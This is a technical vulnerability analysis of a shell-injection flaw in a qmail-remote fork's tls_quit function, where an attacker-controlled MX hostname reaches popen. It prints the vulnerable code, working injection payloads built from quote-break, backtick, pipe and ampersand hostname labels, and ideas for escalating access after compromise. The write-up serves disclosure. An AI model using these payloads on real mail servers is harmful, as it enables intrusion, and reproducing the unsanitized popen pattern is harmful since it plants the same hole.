# Technical Analysis: Remote Code Execution via DNS MX Record Shell Injection in qmail-remote

## 1. Root Cause Analysis

### Vulnerable Code
**File:** `qmail-remote.c`, lines 407-418 (function `tls_quit`)

```c
void tls_quit(const char *s1, const char *s2)
{
  unsigned long i = 0;
  if (control_readint(&i,"control/notlshosts_auto") && i) {
    struct passwd *info = getpwuid(getuid());
    FILE *fp;
    char acfcommand[1200];
    sprintf(acfcommand, "/bin/touch %s/control/notlshosts/'%s'", info->pw_dir, partner_fqdn);
    fp = popen(acfcommand, "r");
    if (fp == NULL) {
      out("Failed to run touch command ");
      exit(1);
    }
    pclose(fp);
  }
}
```

### First Faulty Condition
The `partner_fqdn` variable (line 412) is derived from DNS MX record resolution and is placed directly into a shell command string via `sprintf()`, then executed via `popen()`. There is **zero sanitization** of the hostname. The single-quote wrapping (`'%s'`) is insufficient because single-quote characters themselves can appear in DNS hostnames.

### Data Flow
1. **Source:** DNS MX response for destination domain → `dn_expand()` in `findmx()` (`dns.c:186`) → `name[MAXDNAME]`
2. **Propagation:** `name` → `stralloc_copys(&mx[nummx].sa, name)` (`dns.c:449`) → `dns_ipplus()` → `ix.fqdn = glue.s` (`dns.c:382`) → `ipalloc_append()` → `ip.ix[i].fqdn`
3. **Assignment:** `partner_fqdn = ip.ix[i].fqdn` (`qmail-remote.c:1118`)
4. **Sink:** `sprintf(acfcommand, ".../'%s'", ..., partner_fqdn)` → `popen(acfcommand, "r")` (`qmail-remote.c:412-413`)

### Trigger Conditions
1. **TLS must be compiled in** (default: yes, `#ifdef TLS`)
2. **`control/notlshosts_auto` must contain a value > 0** (administrator configuration for auto-skipping broken TLS hosts)
3. **TLS negotiation must fail** — `tls_quit()` is called on any TLS error (lines 485, 492, 513, 548, 559, 566, 598, 606)
4. **Outbound email must be sent** to attacker-controlled domain (or forwarded to it)

## 2. Exploitation

### Security Primitive
**Arbitrary command execution** as the `qmailr` user (qmail remote delivery user) on the mail server.

### Attack Scenario
1. Attacker registers a domain (e.g., `evil.com`)
2. Attacker configures MX record for `evil.com` pointing to a hostname containing shell metacharacters:
   - DNS label in wire format: `x'`id>/tmp/pwned`'y` (28 bytes, all valid in DNS wire format)
   - After `dn_expand()`: `x'`id>/tmp/pwned`'y.evil.com` (backticks and single quotes are preserved)
3. Attacker configures A record for this hostname pointing to attacker's SMTP server IP
4. Attacker's SMTP server advertises STARTTLS but fails the TLS handshake (e.g., resets connection during SSL negotiation)
5. qmail-remote calls `tls_quit()` which builds shell command:
   ```
   /bin/touch /var/qmail/control/notlshosts/'x'`id>/tmp/pwned`'y.evil.com'
   ```
6. Shell interprets this as:
   - `/bin/touch /var/qmail/control/notlshosts/x` (touch file "x")
   - `id>/tmp/pwned` (backtick command substitution → writes id output)
   - `y.evil.com` (attempt to execute, fails silently)

### Character Escape Analysis (glibc dn_expand / ns_name_ntop)
| Character | Escaped? | Shell Significance |
|-----------|----------|-------------------|
| `'` | NO | Breaks single-quote context |
| `` ` `` | NO | Command substitution |
| `\|` | NO | Pipe |
| `&` | NO | Background/chain |
| `>` | NO | Output redirect |
| `<` | NO | Input redirect |
| `;` | YES (`\;`) | Would be command separator |
| `$` | YES (`\$`) | Would be variable expansion |
| `(` `)` | YES (`\(` `\)`) | Would be subshell |

### Injection Vectors Confirmed
1. **Single-quote break + backtick:** `x'`COMMAND`'y` — backtick provides command substitution
2. **Single-quote break + pipe:** `x'|COMMAND|echo 'y` — pipe chains commands
3. **Single-quote break + ampersand:** `x'&COMMAND&echo 'y` — background execution

### Defenses and Bypasses
| Defense | Status | Bypass |
|---------|--------|--------|
| Single-quote wrapping in sprintf | BYPASSED | Single quote `'` not escaped by dn_expand |
| DNS hostname character restrictions | NOT ENFORCED | DNS wire format allows arbitrary bytes in labels |
| dn_expand character escaping | PARTIAL | Only escapes `;$()".\\`, not `'` `` ` `` `\|&><` |
| Recursive resolver validation | NONE | Most resolvers pass labels through as opaque bytes |

## 3. Escalation

### From qmailr to System Compromise
- **qmailr** is a dedicated user but has **write access** to qmail control files (evidenced by the `touch` command working on `control/notlshosts/`)
- Can modify `control/smtproutes`, `control/virtualdomains`, etc. to redirect mail
- Can read qmail queue files containing email content (sensitive data)
- On many systems, qmailr's home directory is shared with other qmail users
- With write access, attacker can plant a cron job, SSH key, or trojan binary

### Escalation to Root
- If qmail-remote has setuid or is invoked via a setuid chain, escalation may be possible
- The `popen()` call inherits the process environment — attacker's shell commands run with the same privileges
- In configurations where qmail runs as root and drops privileges, timing of the tls_quit call may matter

## 4. Impact Assessment

### CVSS 3.1 Score: 8.0 (High)

| Metric | Value | Justification |
|--------|-------|---------------|
| Attack Vector | Network (AV:N) | Triggered via DNS response to outbound email |
| Attack Complexity | High (AC:H) | Requires `control/notlshosts_auto` to be configured AND outbound email to attacker domain AND TLS failure |
| Privileges Required | None (PR:N) | No authentication needed — attacker just needs their domain to receive email |
| User Interaction | None (UI:N) | Triggered automatically during mail delivery |
| Scope | Unchanged (S:U) | Executes as qmailr, same security context |
| Confidentiality | High (C:H) | Can read mail queue, control files |
| Integrity | High (I:H) | Can modify control files, plant backdoors |
| Availability | High (A:H) | Can disrupt mail delivery |

**Vector String:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H`

### Vulnerable Configurations
- TLS enabled (default in modern qmail builds)
- `control/notlshosts_auto` set to any value > 0
- Outbound email delivery enabled (standard configuration)

### Affected Versions
- **Introducing commit:** `326513f` (October 22, 2024)
- **First affected version:** v2024.10.26
- **Latest affected version:** v2026.04.02 (current HEAD)
- All versions from v2024.10.26 through v2026.04.02 are affected

## 5. Git History

```
commit 326513f79724cc2a6247df180b96de0dabbcf812
Author: sagredo-dev <admin@sagredo.eu>
Date:   Tue Oct 22 18:25:29 2024 +0000

    automatically adds fqdn with obsolete openssl to control/notlshosts
```

Refined in:
```
commit 88821ec1dbf03d4f13c73ce5bb7141bca26f871d
Author: sagredo-dev <admin@sagredo.eu>
Date:   Sat Oct 26 11:21:05 2024 +0000

    Fix dh key too smal
```

## 6. Proof Artifacts

- `/workspace/test_dn_expand2.c` — Validates which characters survive dn_expand
- `/workspace/test_shell_injection.sh` — Validates shell injection via all three vectors
- `/workspace/test_full_chain.c` — Complete chain: DNS response → dn_expand → sprintf → popen → RCE
